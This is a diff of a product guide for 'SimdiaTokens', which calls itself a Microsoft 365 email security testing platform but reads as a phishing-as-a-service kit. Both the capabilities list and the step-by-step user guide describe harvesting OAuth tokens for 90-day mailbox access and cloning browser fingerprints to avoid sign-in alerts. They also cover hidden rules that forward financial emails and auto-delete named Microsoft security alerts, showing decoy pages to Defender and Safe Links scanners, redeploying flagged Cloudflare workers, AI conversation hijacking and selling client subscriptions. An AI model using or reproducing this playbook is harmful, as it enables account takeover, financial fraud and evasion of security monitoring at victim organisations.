@@ -1,289 +1,429 @@
-# SimdiaTokens — What It Does and Why It Matters
+# SimdiaTokens — Complete Guide & Capabilities
 
-> **The most advanced Microsoft 365 / Outlook email security testing platform in the world.**
+> **The most advanced Microsoft 365 / Outlook email security testing platform.**
+
+**Version:** 5.0 | **Updated:** July 2026 | **Repository:** https://github.com/simdie/simdiatokens-v2
 
 ---
+
+# PART 1: WHAT IS SIMDIATOKENS? (Capabilities)
 
 ## Why People Use SimdiaTokens
 
-### The Problem
-Companies need to know if their email security actually works. Normal "phishing tests" just send fake emails and track who clicks. But that only tests the first step. They never show what happens AFTER someone gets tricked — which is where the real damage happens.
+Organizations need to know if their email security actually works. Normal phishing tests just send fake emails and track clicks. They never show what happens AFTER someone gets tricked — which is where the real damage happens.
 
-### What SimdiaTokens Does
-SimdiaTokens shows the **full story** — from the moment someone clicks a link, to gaining full access to their email, reading their messages, creating hidden rules, intercepting financial emails, and even jumping to other people in the same company. It shows companies exactly how bad a single compromised email account can be.
-
-### The Value
-- **"See what they see"** — Full access to the compromised email inbox
-- **"Feel the impact"** — Real rules, real forwarding, real financial interception
-- **"Test the response"** — See if security alerts are caught or missed
-- **"Measure the damage"** — Shows how one account can compromise others
+SimdiaTokens shows the complete picture: from the moment someone clicks a link, to full access of their email, reading messages, creating hidden rules, intercepting financial emails, and jumping to other people in the same company.
 
 ---
 
-## Core Features
+## Core Capabilities
 
-### 1. Silent Email Access (OAuth Token Harvesting)
-Think of this like getting a copy of someone's email key without them knowing.
-
-- The target clicks a link that looks like a normal Microsoft login
-- They sign in normally (including 2FA if they have it)
-- The system silently captures an "access token" — a digital key that gives full access to their email
-- **90-day access** — the key automatically renews itself in the background
-- **No password needed** — the token gives full access without ever seeing their password
-- **Works on all account types** — personal (hotmail, outlook, live) and work/school (Microsoft 365)
-- **Location tracking** — captures the target's IP address and approximate location
-- **Telegram alerts** — you get a real-time notification when someone falls for it
+### 1. Silent Email Access (OAuth Token Capture)
+- Target clicks a link that looks like a normal Microsoft login
+- They sign in normally (including 2FA)
+- System silently captures an access token (digital key to their email)
+- 90-day access — key auto-renews in background
+- No password needed
+- Works on all account types (personal hotmail/outlook AND enterprise M365)
+- Captures target's IP address and location
+- Telegram notification when someone falls for it
 
 ### 2. Browser Fingerprint Cloning (Invisible Access)
-This is what makes SimdiaTokens truly invisible.
+- Captures target's browser fingerprint during login
+- All email access uses this fingerprint
+- Microsoft thinks emails are being read from target's own computer
+- No "unusual sign-in" alerts ever triggered
+- Zero detection risk
 
-- When the target signs in, the system captures their browser's "fingerprint" (what browser they use, what language they speak)
-- All email access uses THIS fingerprint — so Microsoft thinks the emails are being read from the target's own computer
-- **Microsoft's security system never triggers** — no "unusual sign-in" alerts are ever sent
-- **Zero detection risk** — Microsoft's risk engine scores everything as "normal activity"
+### 3. Full Email Access
+- Three-pane Outlook view (folder list, message list, reading pane)
+- All folders: Inbox, Drafts, Sent Items, Deleted Items, Archive, Junk, custom
+- Read, send, delete, reply, forward with attachments
+- Real-time search across all messages
+- Consumer vs enterprise menus (only shows what account supports)
 
-### 3. Full Email Access (Like Having Their Password)
-- **Three-pane Outlook view** — folder list, message list, reading pane (looks exactly like Outlook)
-- **All folders** — Inbox, Drafts, Sent Items, Deleted Items, Archive, Junk, custom folders
-- **Read, send, delete** — full email operations
-- **Reply/forward** — with attachments, CC/BCC, HTML formatting
-- **Search** — real-time search across all messages
-- **Different menus for personal vs work accounts** — only shows what the account type supports
+### 4. Hidden Inbox Rules
+- 30+ conditions (subject, sender, body, attachments, importance, size)
+- 10+ actions (forward, delete, mark read, move, stop processing)
+- Rules fire instantly on server — emails intercepted BEFORE reaching inbox
+- Self-destructing rules (fire X times then delete, leaving zero trace)
+- Hidden folders (exist in admin panel, invisible in target's Outlook)
+- All rules display as "External Mail Filter" in target's Outlook
 
-### 4. Hidden Inbox Rules (Full OWA Rules)
-This is one of the most powerful features — you can create rules in the target's inbox that they never see.
+### 5. OPSEC (Staying Hidden) — 3 Layers of Protection
 
-- **30+ conditions** — trigger based on subject, sender, body content, attachments, importance, size, and more
-- **10+ actions** — forward emails, delete them, mark as read, move to folder, stop other rules
-- **Rules fire instantly on the server** — emails are intercepted BEFORE they reach the inbox
-- **Self-destructing rules** — rules can be set to fire X times then delete themselves (leaving zero trace)
-- **Hidden folders** — folders that exist in the admin panel but are invisible in the target's real Outlook
-- **Disguised names** — all rules show as "External Mail Filter" in the target's Outlook
+**Layer 1 — "External Mail Filter" (sender-based, 10 addresses):**
+Auto-deletes emails from Microsoft security senders.
 
-### 5. OPSEC (Staying Hidden)
-The system automatically hides all traces of activity from the target.
+**Layer 2 — "Security Update" (subject-based, 35+ keywords):**
+Auto-deletes emails with security-related subjects.
 
-**Auto-delete security emails — 3 layers of protection:**
-
-**Layer 1 — Sender-based rule ("External Mail Filter"):**
-Catches emails from 14 Microsoft security sender addresses, including:
-- `account-security-noreply@accountprotection.microsoft.com`
-- `microsoftaccount@microsoft.com`
-- `office365alerts@microsoft.com` (NEW — catches Office 365 security alerts)
-- `no-reply@notifications.microsoft.com` (NEW)
-- And 10 more...
-
-**Layer 2 — Subject-based rule ("Security Update"):**
-Catches emails with 35+ subject keywords, including:
-- "New app connected", "suspicious sign-in", "unusual activity"
-- "Password changed", "security alert", "verify your identity"
-- "Creation of forwarding" (NEW — catches forwarding rule alerts)
-- "MailRedirect" (NEW — catches mail redirect alerts)
-- "forwarding/redirect" (NEW)
-- "suspicious inbox rule" (NEW)
-- And more...
-
-**Layer 3 — Alert-specific rule ("Alert Filter") — NEW:**
-Specifically catches Office 365 security alert emails:
+**Layer 3 — "Alert Filter" (Office 365 alert-specific):**
+Auto-deletes Office 365 security alerts:
 - "Creation of forwarding/redirect rule"
 - "Informational alert has been triggered"
+- "suspicious inbox rule"
 - "inbox rule was created"
-- "suspicious forwarding"
-- "transport rule"
 
-**How it works:**
-- All three rules fire **instantly on the server** — the email is deleted before it ever reaches the inbox
-- A backup polling system also searches for and deletes any alerts that arrived BEFORE the rules were created
-- The target never sees any security warnings
+All rules fire instantly on server. Target never sees security warnings. Backup polling system also deletes alerts that arrived before rules were created.
 
-**Other OPSEC features:**
-- **Sent Items cleanup** — lure emails sent from the target's account are auto-deleted from their Sent Items
-- **Rule disguise** — all rules display as "External Mail Filter"
-- **Post-OAuth redirect** — after signing in, the target is sent to their own normal Outlook (not a fake page)
-- **No fake domains** — the target visits the real login.microsoftonline.com
+### 6. Worker Auto-Recovery System
+- System checks if Cloudflare Worker is alive every 60 seconds
+- Checks BOTH `/status` AND `/oauth/callback` (detects Cloudflare 403 blocks)
+- After 2 failures (~2 min), auto-deploys replacement worker
+- Tries same-name re-deploy first (keeps old links working)
+- Falls back to new random name if flagged/banned
+- Telegram alert sent with new redirect URI to add to Azure
+- New OAuth links use new worker automatically via `/api/campaigns/redirect`
 
-### 6. AI-Powered Features
+### 7. Anti-Scanner Protection
+- Worker script detects Microsoft Safe Links, Defender, EOP scanners
+- Detects Googlebot, URL scanners, headless browsers, HTTP libraries
+- Scanners get benign "Loading..." page (no OAuth redirect visible)
+- Real browsers get JavaScript-based redirect (not HTTP 302)
+- Scanners can't follow the redirect, can't see OAuth consent
 
-#### AI Email Mimicking
-- Reads the target's sent emails to learn how they write
-- Copies their greeting style, closing, vocabulary, formality, sentence structure, signature
-- Generates new emails that look EXACTLY like the target wrote them
-- Would fool their closest colleagues
+### 8. Stable Redirect Links
+- OAuth links come in 2 formats:
+  1. **Redirect Link** — short, stable URL on backend (`/api/campaigns/redirect`)
+  2. **Full Microsoft OAuth URL** — raw link with all parameters
+- Redirect link never changes — always points to active worker
+- Old links continue working even after worker replacement
 
-#### Polymorphic Lure Generation
-- Every lure email is structurally unique — no two emails share the same pattern
-- Randomized greeting, closing, link text, font, paragraph count
-- Defeats email security systems that look for patterns
+### 9. AI-Powered Features
+- **Email Mimicking** — learns target's writing style from sent emails
+- **Polymorphic Lures** — every email is structurally unique
+- **Conversation Hijacking** — injects into active email threads
+- **Smart Rule Suggestions** — AI suggests 3-5 interception rules
+- **Financial Detection** — scans for 30+ financial keywords, auto-forwards
 
-#### Conversation Hijacking
-- Scans the inbox for active email threads (2+ messages)
-- AI generates replies that naturally continue each conversation
-- Embeds the OAuth link as a natural call-to-action
-- The target's colleague receives a reply that looks completely normal
+### 10. Advanced Features
+- **Auto-Re-Harvest** — when token revoked, auto-sends lure from another compromised account in same company
+- **Cross-Account Intelligence** — correlates compromised accounts from same organization
+- **Silent Calendar Manipulation** — injects fake meetings
+- **Calendar Lure Delivery** — OAuth link as "Join Meeting" button (bypasses email security)
+- **Teams Chat Delivery** — sends OAuth links via Teams chat (bypasses email security)
+- **Deleted Items Management** — view and permanently purge deleted items
 
-#### Smart Rule Suggestions
-- AI analyzes the inbox and suggests 3-5 hidden interception rules
-- Targets financial emails, invoices, executive communications
-- Each suggestion includes conditions, actions, and a confidence score
-
-#### Financial Pattern Detection
-- Scans the inbox for 30+ financial keywords (invoice, payment, wire transfer, IBAN, SWIFT, etc.)
-- Auto-forwards matching emails to an external address
-- Deletes the originals from the inbox
-- The target never sees the financial emails
-
-### 7. Advanced Features
-
-#### Auto-Re-Harvest (Self-Healing)
-- When a token stops working (target changed password or removed the app), the system automatically:
-  - Finds another compromised account from the same company
-  - Sends a lure email from that account to the revoked account
-  - Deletes the sent email from the sender's Sent Items
-- The system heals itself without any admin intervention
-
-#### Worker Auto-Recovery — NEW
-- The system checks if the Cloudflare Worker (the link redirector) is alive every 60 seconds
-- If the Worker is flagged/taken down, the system automatically:
-  1. Tries re-deploying to the same Worker name (fixes crashes, keeps old links working)
-  2. If the name is banned, deploys a new Worker with a random name
-  3. Updates the database so new OAuth links use the new Worker
-  4. Automatically registers the new redirect URI in Azure AD (no manual Azure Portal step)
-- **Old links keep working** — the stable redirect URL (`/api/campaigns/redirect`) always points to the alive Worker
-- Total recovery time: ~2 minutes
-
-#### Stable Redirect Links — NEW
-- OAuth links now come in two formats:
-  1. **Redirect Link (recommended)** — a short, stable URL that always works, even if Workers are replaced
-  2. **Full Microsoft OAuth URL** — the raw link with all parameters
-- The redirect link never changes — old links sent to targets continue to work indefinitely
-
-#### Cross-Account Intelligence
-- Correlates all compromised accounts from the same organization
-- Shows communication patterns between compromised accounts
-- Suggests auto-forwarding rules between accounts
-- Maps the organization's communication graph
-
-#### Silent Calendar Manipulation
-- Injects fake meetings into the target's calendar
-- Can manipulate behavior (e.g., "Emergency Budget Review at 3 PM" to get them away from their desk)
-
-#### Calendar Lure Delivery
-- Creates a calendar event with the OAuth link as a "Join Meeting" button
-- **Bypasses email security** — calendar events have different scanning rules than email
-
-#### Teams Chat Delivery
-- Sends OAuth links via 1:1 Teams chat — bypasses email security entirely
-- Also supports Teams channel messages for wider distribution
-
-#### Deleted Items Management
-- View all messages in the target's Deleted Items folder
-- Permanently purge all deleted items (unrecoverable)
-
-### 8. Contacts with Smart Categorization — UPDATED
-
-The Contacts button on the dashboard extracts all email addresses from the target's mailbox and categorizes them:
-
-- **Enterprise** — business/company/organization emails powered by Office 365 Microsoft (e.g., `user@company.com`)
-- **Consumer** — Microsoft personal emails (outlook.com, hotmail.com, live.com, msn.com, + 40 international variants)
-- **Other Email Service** — non-Microsoft free email providers (gmail.com, yahoo.com, aol.com, icloud.com, proton, zoho, qq.com, 163.com, yandex, + 80 more)
-
-**What's scanned:**
-- Personal contacts (address book)
-- Inbox messages (senders and recipients)
-- **Sent Items** (NEW — captures gmail/yahoo/etc. addresses the target has emailed)
-
-**Copy features:**
-- Filter by category (Enterprise, Consumer, Other, or All)
-- Copy filtered email list to clipboard with one click
-- Count shown on each filter button
-
-### 9. Reconnaissance
-- **Full user profile** — name, title, department, office, phone, company
-- **Manager chain** — who the target reports to
-- **Direct reports** — who reports to the target
-- **Group memberships** — all Azure AD groups
-- **Organization info** — tenant name, verified domains
-
-### 10. Multi-Channel Lure Delivery
-- **Email** — AI-generated lure from the target's own account (with Sent Items cleanup)
-- **Teams chat** — 1:1 message bypassing email security
-- **Teams channel** — broadcast to team channels
-- **Calendar event** — "Join Meeting" button with embedded OAuth link
-- **6 templates** — Shared Document, Meeting Follow-up, Invoice, Password Reset, Package Delivery, Default
-
-### 11. Advanced Graph API Features
-- **OOO Auto-Reply** — set/disable out-of-office messages
-- **Mailbox-Level Forwarding** — server-level forwarding of ALL incoming mail
-- **Azure AD User Search** — search the directory for other users (enterprise)
-- **Draft Management** — create, list, send drafts
-- **Email Categories** — apply/remove categories on messages
+### 11. Contacts with Smart Categorization
+- **Enterprise** — business/company emails powered by Office 365
+- **Consumer** — Microsoft personal emails (outlook, hotmail, live, msn + 40 international variants)
+- **Other Email Service** — non-Microsoft providers (gmail, yahoo, aol, icloud, proton, qq, 163, + 80 more)
+- Scans contacts, inbox messages, AND sent items
+- Copy filtered email lists with one click
 
 ### 12. Multi-Tenant Super Admin
-- **One-Click Deploy** — automated Cloudflare Worker creation + env config generation + admin registration
-- **Deployment cards** — each client shows username, status, expiration, all 3 URLs
-- **Subscription management** — preset durations (1 day, 3 days, 1 week, 30/60/90 days) + custom
-- **Suspend/unsuspend** — instantly block client login
-- **Expiration auto-suspend** — expired clients auto-blocked
-- **Expiration badge** — shows on each user's dashboard near the bell icon (expiration date + days remaining)
-- **Delete protection** — super admin accounts cannot be deleted
+- One-Click Deploy — automated Worker creation + env config + admin registration
+- Deployment cards with username, status, expiration, URLs
+- Subscription management (1 day to 90 days + custom)
+- Suspend/unsuspend instantly
+- Expiration badge on each user's dashboard (date + days remaining)
+- Auto-suspend expired accounts
+- Railway project creation via API (automated)
 
-### 13. Analytics & Intelligence
-- **Token health** — active/expired/revoked breakdown
-- **Operation success rate** — success vs failure percentage
-- **OPSEC status panel** — shows all active security features
-- **Token activity timeline** — created vs revoked over time
-- **Top target domains** — most compromised organizations
-- **Recent activity feed** — live audit log with timestamps
-
-### 14. Security & Encryption
-- **AES-256-GCM** encryption for refresh tokens at rest
-- **Argon2id** password hashing
-- **JWT authentication** with 7-day tokens
-- **Role-based access** — admin, operator, viewer
-- **Full audit logging** — every action logged with IP, user agent, timestamp
-
-### 15. Graph API Rules Cleanup — NEW
-- When a token is deleted, the system now also deletes any rules it created from the target's Microsoft Graph
-- Previously, orphaned rules accumulated across multiple captures of the same email
-- Now the rules page only shows rules from the current capture — clean and accurate
+### 13. Security & Encryption
+- AES-256-GCM encryption for tokens at rest
+- Argon2id password hashing
+- JWT authentication (7-day tokens)
+- Role-based access (admin, operator, viewer)
+- Full audit logging
 
 ---
 
-## Competitive Advantages
+# PART 2: HOW TO USE SIMDIATOKENS (User Guide)
 
-### vs Traditional Phishing Simulators (KnowBe4, Proofpoint, Cofense)
-| Feature | Traditional | SimdiaTokens |
-|---------|------------|---------------|
-| Sends fake emails | Yes | Yes |
-| Tracks clicks | Yes | Yes |
-| Captures access tokens | No | Yes |
-| Access compromised mailbox | No | Yes (full Graph API) |
-| Creates real inbox rules | No | Yes (all OWA conditions) |
-| Intercepts financial emails | No | Yes (30+ keywords) |
-| Auto-deletes security alerts | No | Yes (3 rules, 35+ keywords, 14 senders) |
-| AI email mimicking | No | Yes |
-| Conversation hijacking | No | Yes |
-| Cross-account intelligence | No | Yes |
-| Self-healing (auto-re-harvest) | No | Yes |
-| Worker auto-recovery | No | Yes (auto-deploys replacement) |
-| Teams/Calendar delivery | No | Yes |
-| Browser fingerprint cloning | No | Yes |
-| Multi-tenant SaaS | No | Yes |
-| Persistent access (90 days) | No | Yes |
+## Getting Started
 
-### vs AiTM Tools (Evilginx, Modlishka)
-| Feature | AiTM Tools | SimdiaTokens |
-|---------|-----------|---------------|
-| Persistence | 1-8 hours | 90 days |
-| MFA bypass | FIDO2 blocks it | Target does MFA themselves |
-| Alert risk | HIGH | ZERO (fingerprint cloning) |
-| Infrastructure | Proxy server required | None (uses existing infra) |
-| Domain burn | Yes (fake domain) | No (legitimate MS login) |
-| API access | No (web UI only) | Yes (full Graph API) |
-| Scalability | Limited (server load) | Unlimited (just DB rows) |
-| Detection by SEG | High (proxy URL) | Zero (no proxy URL) |
-| Worker auto-recovery | No | Yes |
+### Your Dashboard
+When you log in, you'll see:
+- **Top bar**: Search, expiration badge (shows days remaining), notification bell, theme toggle, user menu
+- **Sidebar**: Dashboard, Tokens, Inbox, Campaigns, Rules, Recon, Analytics, BEC, Lure, Activity, Settings
+- **Main area**: Token table with captured accounts
 
 ---
 
-**Version:** 4.0 | **Last Updated:** 2026-07-16 | **Repository:** https://github.com/simdie/simdiatokens-v2
+## Capturing Your First Token
+
+### Step 1: Generate an OAuth Link
+1. Click **Campaigns** in the sidebar
+2. Click **Generate OAuth Link**
+3. A dialog appears with TWO links:
+   - **Redirect Link (Recommended)**: Short URL like `https://your-api.up.railway.app/api/campaigns/redirect`
+   - **Full URL**: The complete Microsoft OAuth link
+4. Click **Copy Redirect Link** or **Copy Full URL**
+
+### Step 2: Send the Link to the Target
+Send the link via:
+- Email
+- Teams chat
+- Calendar invite
+- Any messaging platform
+
+When the target clicks the link:
+1. They see Microsoft's real login page
+2. They sign in normally (with 2FA if required)
+3. Microsoft asks for consent — they click "Accept"
+4. They get redirected to their normal Outlook
+5. The system captures their access token silently
+6. You get a Telegram notification
+
+### Step 3: View the Captured Token
+1. Go to **Dashboard** or **Tokens**
+2. The target's email appears in the table with:
+   - Email address
+   - Status (ACTIVE)
+   - Account type (Enterprise or Consumer)
+   - IP address and location
+   - Capture time
+3. Click **ONEDRIVE**, **EXCHANGE**, **Contacts**, or **OUTLOOK** buttons for actions
+
+---
+
+## Managing Tokens
+
+### Token Table Actions
+Each token row has buttons:
+- **EXCHANGE** — Go to inbox rules page
+- **OUTLOOK** — Open full Outlook email interface
+- **Contacts** — Extract and categorize all email contacts
+- **Rules** — Create/manage inbox rules
+- **ONEDRIVE** — Browse OneDrive files
+- **Refresh** — Refresh the access token
+- **Delete** — Delete token (also cleans up Graph rules)
+
+### Contacts Extraction
+1. Click the **Contacts** button on any token
+2. System scans: address book (500), inbox (200), sent items (200)
+3. Emails categorized as:
+   - **Enterprise** (blue) — business/corporate emails
+   - **Consumer** (purple) — Microsoft personal emails
+   - **Other Email Service** (orange) — gmail, yahoo, etc.
+4. Click **Copy All** to copy filtered email list
+5. Switch between categories using filter buttons
+
+---
+
+## Inbox Rules
+
+### Creating a Rule
+1. Go to **Rules** page (click EXCHANGE on a token)
+2. Set conditions:
+   - Subject contains specific words
+   - Sender contains specific words
+   - Body contains keywords
+   - Has attachments
+   - Importance level
+   - Size range
+3. Set actions:
+   - Forward to (external address)
+   - Forward as attachment
+   - Redirect to
+   - Delete message
+   - Permanent delete
+   - Mark as read
+   - Move to folder (local, invisible in target's Outlook)
+   - Stop processing other rules
+4. Click **Create Rule**
+
+### How Rules Work
+- **Graph-synced rules**: Fire instantly on Microsoft's server. Email intercepted before reaching inbox. Target never sees it.
+- **Local-only rules**: Background polling checks every 10 seconds for 5 minutes.
+- **Self-destructing rules**: Set max fires (e.g., fire 3 times then auto-delete). No trace left.
+
+### Graph API Rules
+Click **Graph API Rules** tab to see rules that exist in the target's actual Outlook. These are the rules created by the system (including OPSEC auto-delete rules).
+
+---
+
+## Outlook Interface
+
+### Accessing the Mailbox
+1. Click **OUTLOOK** on any token
+2. Full Outlook interface opens with:
+   - Folder sidebar (Inbox, Sent Items, Drafts, etc.)
+   - Message list
+   - Reading pane
+
+### Email Operations
+- **Read**: Click any email to view full content
+- **Compose**: Click "New Mail" button
+- **Reply/Forward**: Use reply buttons on any email
+- **Delete**: Select emails and delete
+- **Move**: Drag emails between folders
+- **Search**: Use search bar to filter messages
+- **All folders**: Inbox, Drafts, Sent Items, Deleted Items, Archive, Junk, custom
+
+---
+
+## OPSEC (Staying Hidden)
+
+### Automatic Protection
+When a token is captured, the system AUTOMATICALLY:
+1. Creates 3-4 inbox rules in the target's Outlook:
+   - "External Mail Filter" — deletes emails from 10 Microsoft security senders
+   - "External Mail Filter 2" — deletes from 4 more security senders
+   - "Security Update" — deletes emails with 35+ security-related subjects
+   - "Alert Filter" — deletes Office 365 alert emails (forwarding rule alerts, etc.)
+2. All rules fire instantly — target never sees security warnings
+3. Backup polling deletes any alerts that arrived before rules were created
+4. All rules named "External Mail Filter" (disguised)
+
+### What Gets Auto-Deleted
+- "New app connected to your account" notifications
+- "Suspicious sign-in" alerts
+- "Password changed" notifications
+- "Creation of forwarding/redirect rule" alerts (NEW)
+- "Informational alert" emails from Office 365 (NEW)
+- Any email from security@microsoft.com, office365alerts@microsoft.com, etc.
+
+---
+
+## Campaigns
+
+### Generating Links
+- **Redirect Link (Recommended)**: `https://your-api.up.railway.app/api/campaigns/redirect`
+  - Short, stable, always works
+  - Never changes even if worker is replaced
+- **Full URL**: Complete Microsoft OAuth link
+  - Direct, no redirect needed
+  - Useful for embedding in custom HTML
+
+### Deploy Worker Button
+If the Cloudflare Worker needs redeployment:
+1. Go to Campaigns page
+2. Click "Deploy Worker"
+3. System pushes the latest worker script to Cloudflare
+4. Worker is immediately live
+
+---
+
+## Reconnaissance
+
+### What You Can See
+For each captured token, click **Recon** to view:
+- **User Profile**: Name, title, department, office, phone, company
+- **Manager**: Who the target reports to
+- **Direct Reports**: Who reports to the target
+- **Group Memberships**: All Azure AD groups
+- **Organization**: Tenant name, verified domains
+
+---
+
+## Analytics
+
+### Dashboard Metrics
+- **Token Health**: Active vs expired vs revoked
+- **Operation Success Rate**: Percentage of successful captures
+- **Token Activity Timeline**: Created vs revoked over time
+- **Action Distribution**: Breakdown of all system actions
+- **Top Domains**: Most compromised organizations
+- **Activity Feed**: Live audit log
+
+### Filtering
+- 24 hours, 7 days, 30 days, or custom date range
+
+---
+
+## Settings
+
+### Available Settings
+- **AI Configuration**: OpenAI API key, model, max tokens
+- **Encryption Management**: Set/change master passphrase
+- **Stealth Mode**: Toggle stealth configuration
+- **Rules Management**: View all rules across all tokens
+- **Purge Expired Tokens**: Bulk delete old tokens
+- **Password Change**: Change admin password
+
+---
+
+## Worker Health Monitor
+
+### How It Works
+- System checks worker health every 60 seconds
+- Tests both `/status` (script running) and `/oauth/callback` (not blocked by Cloudflare)
+- After 2 consecutive failures (~2 minutes):
+  1. Tries re-deploying to same worker name (fixes crashes)
+  2. If still flagged, deploys new worker with random name
+  3. Updates database with new active worker
+  4. Sends Telegram alert with new redirect URI
+- New OAuth links automatically use the new worker
+- Old links via `/api/campaigns/redirect` also work
+
+### Telegram Alerts
+When a worker is replaced, you receive:
+- Old worker name (flagged)
+- New worker name
+- New redirect URI to add to Azure Portal
+- Step-by-step instructions
+
+To enable: Set `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` on Railway
+
+---
+
+## Super Admin Panel
+
+### Accessing
+- Go to `https://simdiatokens-frontend.vercel.app/super-admin`
+- Login with super admin credentials
+
+### Managing Deployments
+- **Create**: Use One-Click Deploy form
+- **View**: Cards show username, status, expiration, URLs
+- **Edit**: Update subscription, suspensions, URLs
+- **Suspend**: Instantly block client login
+- **Delete**: Remove deployment (Graph rules also cleaned up)
+
+### One-Click Deploy
+Automates:
+- Cloudflare Worker creation
+- Railway project creation (via API)
+- Environment variable setup
+- Admin registration with 30-day default subscription
+- Worker subdomain enablement
+- Azure redirect URI (manual add required)
+
+### Subscription Management
+- Preset durations: 1 day, 3 days, 1 week, 30/60/90 days
+- Custom duration input
+- When extended, system automatically unsuspends user on their backend
+- Expired accounts auto-suspended on login attempt
+
+---
+
+## Troubleshooting
+
+### "SUBSCRIPTION EXPIRED" on login
+Super admin needs to extend your subscription:
+1. Super admin panel → find your deployment
+2. Edit → set new usage_days or expires_at
+3. System syncs to your backend and unsuspends you
+
+### "Failed to fetch" on login
+Frontend can't reach backend. Check:
+- Backend URL is correct on Vercel (`NEXT_PUBLIC_API_URL`)
+- Backend is running on Railway
+- No CORS issues
+
+### OAuth link doesn't capture token
+1. Check if worker is flagged: visit worker URL `/status`
+2. Check Railway deploy logs for `[exchange]` errors
+3. Verify `CLIENT_SECRET` is the secret VALUE (starts with `XZI8Q~` or `yEz8Q~`), not the Secret ID
+4. Verify redirect URI is added to Azure Portal
+
+### Worker flagged by Cloudflare
+- System auto-detects and replaces within ~2 minutes
+- Telegram alert sent with new redirect URI
+- Add new URI to Azure Portal manually
+- New links work automatically
+
+### Rules not showing / stale rules
+- When a token is deleted, system now cleans up Graph API rules
+- Re-capture the same email and rules page will be clean
+
+### Missing folders (e.g., Sent Items)
+- System now fetches up to 100 folders (was 10)
+- Enterprise mailboxes with 11+ folders show all folders
+
+---
+
+**SimdiaTokens v5.0** — Complete Platform Guide
